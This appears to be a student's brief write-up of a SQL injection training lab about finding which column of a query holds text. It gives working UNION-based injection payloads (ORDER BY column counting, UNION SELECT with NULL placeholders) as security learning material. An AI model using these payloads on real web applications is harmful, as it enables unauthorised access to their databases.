==> SQLi lab 8
==> Goal: finding a column containing text

we have given a task that we have to find the column that has a text datatype and also given a string which we have to retrive from database
the string: VgYXhU

> first finding out how many columns query is using?
by seeing the site we can assume that query is using 3 columns with different datatypes
we can also find out by using orer by clause : payload: ' ORDER BY 4-- (shows internal server error means 3 columns are being used)

> after we know that there are 3 columns we find the datatype of each columns
payload: ' UNION SELECT 'a','a','a'-- (if 200OK then all the columns have text data type)
payload that worked: ' UNION SELECT NULL,'a',NULL-- (column 2 is text datatype)

> now that we know 2nd column is type string put the string VgYXhU is 2nd position and run the payload
payload: ' UNION SELECT NULL,'VgYXhU',NULL--
lab is solved...
